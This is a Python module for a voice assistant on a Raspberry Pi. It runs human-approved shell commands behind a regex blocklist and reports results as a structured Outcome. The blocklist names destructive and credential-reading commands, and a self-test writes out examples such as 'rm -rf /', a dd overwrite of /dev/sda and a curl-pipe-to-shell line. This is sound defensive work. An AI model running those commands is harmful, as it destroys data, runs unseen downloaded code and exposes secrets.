#!/usr/bin/env python3
"""
Module:  os_controller.py
Purpose: Run a shell command on the Pi, and refuse the ones that end the day badly.
Author:  LB
Date:    2026-08-18 (blocklist widened 2026-08-19; Outcome added 2026-08-21)

## Where this sits, and what it is not

LB's design (D4) has the model compose the command and a human approve it. This blocklist is
**not** the approval — `engine/core.py` and `orchestrator/classify_yes.py` are, and nothing
reaches here without an explicit yes.

This is the layer under that: the things that must not run **even if approved**. It exists
because approval over voice is approval of a paraphrase, and because a yes given while
distracted is still a yes. It is a backstop, not a gate.

**A blocklist is the weaker half of the pair and is known to be.** It cannot enumerate every
way to destroy a filesystem, and anything clever enough to want to get past it will. It stops
the realistic failure: a model that has misunderstood the question producing something
sweeping and plausible-looking, and a tired person saying yes to it.

The list was three entries — `rm -rf /`, `mkfs`, and a fork bomb — which covered none of
`dd`, `shutdown`, `chmod -R 777 /`, redirecting over a block device, piping a download into a
shell, or `rm -rf ~`. Those are the ones a confused model actually writes.

## Matching is on the NORMALISED command

`rm  -rf  /` and `rm -rf /` are the same command and a substring match sees two different
strings. Whitespace is collapsed before anything is compared, so padding does not walk past
the list. Case is not folded — Linux commands are case-sensitive and `RM` is not `rm`.

## What happened is STATED, not re-parsed from prose (2026-08-21)

`run_command()` returns an `Outcome`. It used to return a formatted string, and the caller in
`agents/os_agent.py` worked out whether it had failed by testing `.startswith("Terminal
Error:")`.

That is a parser for a string formatted eight lines above it — two schemas, in one repo, with
no compiler between them. It lost twice. `"Error: Command timed out after 15 seconds."` was in
neither prefix, so a command that was **started and then killed** was announced as *"Done. The
output's on the screen."* And `"Action Blocked:"` was in the failure list, so the blocklist
doing its job was announced as a malfunction — which this file's own docstring, four paragraphs
up, says is how a safety layer gets switched off.

Both failures have the same shape: **a confident success**, which is the one shape nobody
escalates. So the producer now states the result and nobody re-derives it. `refuse()` was split
out of the tool for the same reason — so a decision could be tested without running anything.

`Outcome.text` reproduces the old strings verbatim, because the `@tool` return value is a
schema the model sees and `run_os_agent()` still wants prose.
"""

from __future__ import annotations

import re
import subprocess
from dataclasses import dataclass

from langchain_core.tools import tool

TIMEOUT_S = 15

# Every way an OS action can end. The kind selects the sentence LB hears; it is never itself
# spoken. Kept as one flat vocabulary across both tools — the shell and the app launcher — so
# `agents/os_agent.py` has exactly one table to be total over, and a harness can prove it is.
KINDS: tuple[str, ...] = (
    # --- execute_terminal_command ---
    "output",         # ran, exit 0
    "error",          # ran, non-zero exit
    "blocked",        # refused by FORBIDDEN. NOT a failure — the guard worked.
    "timeout",        # started, then killed at TIMEOUT_S. subprocess.run kills on timeout.
    "crash",          # something went wrong on our side, not the command's
    # --- launch_app (tools/app_launcher.py) ---
    "launched",       # systemd-run reported a successful execve
    "no-display",     # no Wayland socket found; nothing was run
    "not-installed",  # the desktop entry's binary is not on the pinned PATH
    "unknown-app",    # no entry in the catalogue matched
    "ambiguous",      # several entries matched and guessing would open the wrong one
    "launch-failed",  # systemd-run returned non-zero
    # --- plumbing ---
    "unknown-tool",   # a Pending named a tool this agent does not have
)


@dataclass(frozen=True)
class Outcome:
    """What actually happened, stated by the thing that did it.

    Args:
        ok:      did the thing LB approved actually happen. The ONE bit the speech turns on.
                 A refusal is `ok=False` but it is not an `error` — see `kind`.
        kind:    one of `KINDS`. Selects the sentence; never spoken itself.
        detail:  the verbatim output, error text, or reason. Goes on a card. **Never spoken** —
                 it is unbounded, and Piper reads ~40 words in 15 seconds.
        subject: the spoken name of what this was about ("Firefox"), or "" for shell commands.
    """

    ok: bool
    kind: str
    detail: str = ""
    subject: str = ""

    @property
    def text(self) -> str:
        """The prose form, verbatim as it was before `Outcome` existed.

        Three callers still want a string: the `@tool` return value (a schema the model sees),
        `run_os_agent()`'s `--text` path, and `Response.raw`. None of them should have to know
        this type exists.
        """
        if self.kind == "output":
            return f"Terminal Output:\n{self.detail}"
        if self.kind == "error":
            return f"Terminal Error:\n{self.detail}"
        if self.kind == "blocked":
            return (f"Action Blocked: that command was refused because it involves "
                    f"{self.detail}. If you genuinely need it, run it yourself in a terminal.")
        if self.kind == "timeout":
            return f"Error: Command timed out after {TIMEOUT_S} seconds."
        if self.kind == "crash":
            return f"System Error: {self.detail}"
        # The launcher kinds. `subject` is the app; `detail` is why, or the unit name.
        head = f"{self.kind}: {self.subject}" if self.subject else self.kind
        return f"{head}\n{self.detail}".rstrip()

# Patterns, not substrings, because the dangerous shapes have arguments in the middle of them.
# Each entry is (regex, what to say). The message names the specific thing refused — "action
# blocked" with no reason is how a safety layer gets switched off in frustration.
FORBIDDEN: list[tuple[re.Pattern, str]] = [
    # --- destroying the filesystem -------------------------------------------------------
    (re.compile(r"\brm\s+(-\w+\s+)*-\w*[rR]\w*f|\brm\s+(-\w+\s+)*-\w*f\w*[rR]"),
     "a recursive forced delete"),
    (re.compile(r"\brm\b.*\s(/|~|\$HOME|/\*)\s*$"), "deleting a home or root path"),
    (re.compile(r"\bmkfs(\.\w+)?\b"), "formatting a filesystem"),
    (re.compile(r"\bdd\b[^|]*\bof=\s*/dev/"), "writing raw blocks to a device"),
    (re.compile(r">\s*/dev/(sd|nvme|mmcblk|hd)"), "redirecting over a block device"),
    (re.compile(r"\bshred\b"), "shredding files"),
    (re.compile(r"\bwipefs\b"), "wiping filesystem signatures"),

    # --- taking the machine away ---------------------------------------------------------
    # He lives on this Pi. A command that powers it off ends the conversation and, if it
    # happened mid-answer, ends it in a way that looks exactly like a crash.
    (re.compile(r"\b(shutdown|poweroff|halt|reboot|init\s+0|init\s+6)\b"),
     "shutting the machine down"),
    # `(--\w[\w-]*\s+)*` because the real command is `systemctl --user disable oddball` — the
    # flag sits between the verb and the noun, and a pattern without it matches nothing LB
    # would ever actually type.
    (re.compile(r"\bsystemctl\s+(--\w[\w-]*\s+)*(stop|disable|mask)\s+oddball"),
     "stopping his own service"),

    # --- fork bombs and resource exhaustion ----------------------------------------------
    (re.compile(r":\(\)\s*\{.*\|.*&.*\}\s*;?\s*:"), "a fork bomb"),
    (re.compile(r"\byes\b\s*>\s*/"), "filling the disk"),

    # --- permissions and ownership, applied sweepingly ------------------------------------
    (re.compile(r"\bchmod\s+(-\w+\s+)*-?[rR]\b.*\s(/|~|/\*)\s*$"),
     "a recursive permission change on a root or home path"),
    (re.compile(r"\bchmod\s+(-\w+\s+)*777\s+(/|~|/\*)\s*$"),
     "making a root or home path world-writable"),
    (re.compile(r"\bchown\s+(-\w+\s+)*-?[rR]\b.*\s(/|~)\s*$"),
     "a recursive ownership change on a root or home path"),

    # --- running something downloaded, unseen ---------------------------------------------
    # The shape is curl-pipe-shell. It is refused because approving it approves whatever
    # happens to be at the far end at that moment, which is not a thing anyone can consent to.
    (re.compile(r"\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z|k|)sh\b"),
     "piping a download straight into a shell"),

    # --- credentials -----------------------------------------------------------------------
    # Not destructive, but this reads it aloud and puts it on a card that may be on camera.
    # No `\b` before `\.env`: a word boundary needs a word character on one side, and a space
    # followed by a dot has none — so `\b\.env\b` matches "x.env" and never " .env", which is
    # the spelling that actually appears. Anchored on start-or-separator instead.
    (re.compile(r"\bcat\b[^|]*(?:^|[\s/])(\.env|id_rsa|id_ed25519|shadow|\.aws/credentials)\b"),
     "reading a credentials file"),
    (re.compile(r"\bhistory\b\s*$"), "dumping shell history"),
]


def normalise(command: str) -> str:
    """Collapse whitespace so padding cannot walk past the list.

    `rm  -rf   /` and `rm -rf /` are the same command; a substring match sees two strings.
    Case is NOT folded: Linux is case-sensitive and pretending otherwise would refuse
    legitimate commands that merely contain an uppercase word.
    """
    return re.sub(r"\s+", " ", (command or "").strip())


def refuse(command: str) -> str | None:
    """Why `command` must not run, or None if there is no reason.

    Separated from the tool so `tools/verify_os_guard.py` can test the decision without
    running anything, which is the only sane way to test a destructive-command blocklist.
    """
    flat = normalise(command)
    if not flat:
        return "an empty command"
    for pattern, why in FORBIDDEN:
        if pattern.search(flat):
            return why
    return None


def run_command(command: str) -> Outcome:
    """Run `command` under the shell and say what happened.

    Split out of the tool for the reason `refuse()` was: so the result can be tested without a
    LangChain tool wrapper in the way, and so the caller reads a field instead of parsing prose.

    **This path is for commands that FINISH** — a temperature, a disk usage, a service status.
    It is the wrong tool for starting a program: `capture_output=True` holds the pipes open, and
    `subprocess.run(timeout=...)` *kills* the child when the timeout expires, so a GUI app
    launched here appears and then dies at `TIMEOUT_S`. Apps go through
    `tools/app_launcher.py`, which hands the process to systemd and returns in milliseconds.

    Args:
        command: the shell command, exactly as approved.

    Returns:
        An `Outcome`. Never raises — a crash on our side is `kind="crash"`.
    """
    blocked = refuse(command)
    if blocked is not None:
        # ok=False, but the kind is "blocked" and NOT "error". The guard working correctly is
        # not a malfunction, and reporting it as one is how it gets switched off.
        return Outcome(ok=False, kind="blocked", detail=blocked)

    try:
        result = subprocess.run(
            command,
            shell=True,
            text=True,
            capture_output=True,
            timeout=TIMEOUT_S,
        )
        if result.returncode == 0:
            return Outcome(ok=True, kind="output", detail=result.stdout)
        return Outcome(ok=False, kind="error", detail=result.stderr)

    except subprocess.TimeoutExpired:
        # subprocess.run kills the child before re-raising, so this is not "it is still going" —
        # it is "it was going, and I stopped it". The spoken sentence says so.
        return Outcome(ok=False, kind="timeout", detail=command)
    except Exception as e:                                             # noqa: BLE001
        return Outcome(ok=False, kind="crash", detail=str(e))


@tool
def execute_terminal_command(command: str) -> str:
    """
    Executes a bash/terminal command on the Raspberry Pi and returns its TEXT output.
    Use this for temperatures, disk space, memory, processes, files, services and packages.

    This has NO SCREEN attached. Never use it to start a graphical application — nothing will
    appear. Use `launch_app` for that.
    """
    # A one-line wrapper on purpose: the signature is part of a schema Gemini sees, so the
    # return type stays `str` even though everything inside the repo now passes an Outcome.
    return run_command(command).text


if __name__ == "__main__":
    import sys

    for arg in sys.argv[1:] or ["ls -la", "rm -rf /", "dd if=/dev/zero of=/dev/sda",
                                "curl http://x.sh | sh", "cat /sys/class/thermal/thermal_zone0/temp"]:
        why = refuse(arg)
        print(f"  {arg!r:52} {'REFUSED: ' + why if why else 'allowed'}")
